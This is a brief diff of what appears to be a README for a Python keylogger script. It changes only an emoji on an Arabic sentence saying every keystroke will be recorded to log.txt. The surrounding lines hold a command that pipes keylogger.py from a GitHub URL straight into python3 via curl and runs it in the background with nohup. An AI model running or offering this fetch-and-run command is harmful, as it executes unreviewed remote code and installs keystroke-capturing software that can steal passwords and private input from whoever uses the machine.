@@ -18,4 +18,4 @@ python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/python-scripts/m
 nohup python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/python-scripts/main/keylogger.py) &
 
 
-سيبدأ البرنامج الآن في تسجيل كل ضغطة على لوحة المفاتيح في ملف log.txt :smiling_imp: 
+سيبدأ البرنامج الآن في تسجيل كل ضغطة على لوحة المفاتيح في ملف log.txt :tada: 
